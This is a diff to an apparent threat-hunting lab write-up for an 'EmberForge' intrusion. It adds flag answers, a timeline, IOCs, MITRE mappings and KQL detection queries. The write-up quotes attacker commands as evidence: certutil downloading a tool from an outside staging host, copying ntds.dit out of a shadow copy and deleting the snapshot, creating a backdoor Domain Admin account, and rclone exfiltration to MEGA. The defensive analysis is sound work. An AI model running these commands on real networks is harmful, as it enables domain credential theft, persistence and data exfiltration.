@@ -97,6 +97,9 @@
 | Flag 30 | File copy to server via admin share | `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe` | — |
 | Flag 31 | Utility used to download tools on server | `certutil.exe > http://sync.cloud-endpoint.net:8080/AnyDesk.exe` | 2026-01-30 22:10:52 |
 | Flag 32 | Random service name used for remote execution | `MzLblBFm` | — |
+| Flag 33 | First command on server | `whoami` | — |
+| Flag 34 | Failed auth protocol | `NTLM` | — |
+| Flag 35 | First command on DC + extraction tool | `whoami > vssadmin.exe` | — |
 
 ---
 
@@ -152,11 +155,20 @@ nltest /dclist:emberforge.local     → locate the Domain Controller
 
 ### Lateral Movement to Server
 ```
-1. Open SMB inbound firewall rule → netsh advfirewall add rule name="SMB" port=445
-2. Create staging share → net share tools=C:\Users\Public /grant:everyone,full
-3. Copy payload → cmd.exe /c copy update.exe \\10.1.57.66\C$\Users\Public\update.exe
-4. Remote execution → service MzLblBFm created on server
-5. Server downloads tools → certutil -urlcache -f sync.cloud-endpoint.net:8080/AnyDesk.exe
+1. NTLM auth attempts failed (4625 events) from workstation → server
+2. Open SMB inbound firewall rule → netsh advfirewall add rule name="SMB" port=445
+3. Create staging share → net share tools=C:\Users\Public /grant:everyone,full
+4. Copy payload → cmd.exe /c copy update.exe \\10.1.57.66\C$\Users\Public\update.exe
+5. Remote execution → service MzLblBFm created on server
+6. First command on server → whoami
+7. Server downloads tools → certutil -urlcache -f sync.cloud-endpoint.net:8080/AnyDesk.exe
+```
+
+### Lateral Movement to Domain Controller
+```
+1. Remote service execution from server → DC
+2. First command on DC → whoami
+3. VSS sequence begins → vssadmin.exe
 ```
 
 ### Credential Access
@@ -165,9 +177,18 @@ nltest /dclist:emberforge.local     → locate the Domain Controller
 
 **VSS Credential Theft (Domain Controller):**
 ```
-vssadmin create shadow /For=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
-vssadmin delete shadows /Quiet   ← evidence destroyed
+vssadmin list shadows /for=C:          → check existing snapshots
+vssadmin create shadow /For=C:         → create snapshot
+vssadmin list shadows /for=C:          → confirm snapshot + grab path
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit
+     C:\Windows\Temp\nyMdRNSp.tmp      → extract AD database
+vssadmin delete shadows /Quiet         → destroy evidence
+```
+
+### Persistence — Backdoor Account (DC)
+```
+net user svc_backup P@ssw0rd123! /add /domain      → create domain account
+net group "Domain Admins" svc_backup /add /domain  → elevate to Domain Admin
 ```
 
 ### Exfiltration
@@ -183,6 +204,7 @@ rclone.exe → MEGA (jwilson.vhr@proton.me) → 66.203.125.15 (bt5.api.mega.co.n
 
 | Time (UTC) | Host | Event |
 |---|---|---|
+| 21:09 | DC | Splunk Universal Forwarder running (baseline) |
 | 21:18 | Workstation | Edge browser active — Lisa browsing |
 | 21:23 | Workstation | 7-Zip installer downloaded and executed |
 | 21:24 | Workstation | Archive extracted → `EmberForge_Review\` |
@@ -195,18 +217,24 @@ rclone.exe → MEGA (jwilson.vhr@proton.me) → 66.203.125.15 (bt5.api.mega.co.n
 | 21:44 | Workstation | SYSTEM persistence cemented |
 | 21:xx | Workstation | Injection: `update.exe → spoolsv.exe (SYSTEM)` |
 | 21:xx | Workstation | LSASS dumped → `C:\Windows\System32\lsass.dmp` |
+| 21:xx | Workstation | NTLM auth failures against server |
 | 21:xx | Workstation | SMB firewall rule added, `tools` share created |
 | 21:xx | Workstation | `update.exe` copied to server via `C$` admin share |
 | 22:10 | Server | Service `MzLblBFm` created — remote execution |
+| 22:10 | Server | First command: `whoami` |
 | 22:10 | Server | `certutil` downloads `AnyDesk.exe` from staging server |
 | 22:17 | Server | PowerShell IWR downloads `update.exe` |
 | 22:18 | Server | `certutil` downloads `update.exe` (second attempt) |
 | 23:06 | Server | `rclone.exe` executed |
 | 23:11 | Server | `Compress-Archive C:\GameDev → gamedev.zip` |
 | 23:12 | Server | `rclone` uploads to MEGA → `66.203.125.15` |
-| 23:35 | DC | VSS shadow copy created |
-| 23:35 | DC | `ntds.dit` copied to `C:\Windows\Temp\nyMdRNSp.tmp` |
+| 23:34 | DC | First command: `whoami` → `vssadmin.exe` |
+| 23:34 | DC | `vssadmin list shadows /for=C:` |
+| 23:35 | DC | `vssadmin create shadow /For=C:` |
+| 23:35 | DC | `ntds.dit` copied → `C:\Windows\Temp\nyMdRNSp.tmp` |
 | 23:35 | DC | Shadow copy deleted — evidence destroyed |
+| 23:38 | DC | Backdoor account created: `svc_backup` / `P@ssw0rd123!` |
+| 23:39 | DC | `svc_backup` added to Domain Admins |
 
 ---
 
@@ -220,6 +248,16 @@ rclone.exe → MEGA (jwilson.vhr@proton.me) → 66.203.125.15 (bt5.api.mega.co.n
 | Exfil destination | `bt5.api.mega.co.nz` / `66.203.125.15` |
 | MEGA account | `jwilson.vhr@proton.me` |
 | MEGA password | `Summer2024!` |
+
+---
+
+## Backdoor Accounts — Immediate Action Required
+
+| Account | Password | Privilege | Host |
+|---|---|---|---|
+| `svc_backup` | `P@ssw0rd123!` | Domain Admin | Domain Controller |
+
+> ⚠️ This account must be disabled and removed immediately. All Domain Admin accounts should be audited for unauthorized additions.
 
 ---
 
@@ -240,6 +278,7 @@ rclone.exe → MEGA (jwilson.vhr@proton.me) → 66.203.125.15 (bt5.api.mega.co.n
 | Certutil download (LOTL) | T1105 | `certutil -urlcache -f` |
 | Rclone exfiltration | T1048 | `gamedev.zip` → MEGA |
 | Domain discovery | T1069.002 | `net user`, `net group`, `nltest` |
+| Create domain account | T1136.002 | `svc_backup` added to Domain Admins |
 
 ---
 
@@ -252,6 +291,15 @@ EmberForgeX_CL
 | where EventCode_s == "1"
 | where Computer contains "B9GHHO6"
 | project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
+| sort by todatetime(UtcTime_s) asc
+
+// Attacker commands on DC (filter Splunk noise)
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where EventCode_s == "1"
+| where Computer contains "EEU3IA2"
+| where ParentImage_s contains "services.exe"
+| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, process_exec_s, CommandLine_s
 | sort by todatetime(UtcTime_s) asc
 
 // Process injection events
@@ -305,6 +353,17 @@ EmberForgeX_CL
 | extend ServiceName = extract("ServiceName'>([^<]+)", 1, Raw_s)
 | extend ServicePath = extract("ImagePath'>([^<]+)", 1, Raw_s)
 | project TimeGenerated, Computer, ServiceName, ServicePath
+
+// NTLM auth failures
+EmberForgeX_CL
+| where EventCode_s == "4625"
+| where Computer contains "16V3AU4"
+| extend LogonType = extract("LogonType'>([^<]+)", 1, Raw_s)
+| extend TargetUser = extract("TargetUserName'>([^<]+)", 1, Raw_s)
+| extend SourceIP = extract("IpAddress'>([^<]+)", 1, Raw_s)
+| extend AuthPackage = extract("AuthenticationPackageName'>([^<]+)", 1, Raw_s)
+| project TimeGenerated, Computer, TargetUser, LogonType, AuthPackage, SourceIP
+| sort by TimeGenerated asc
 ```
 
 ---
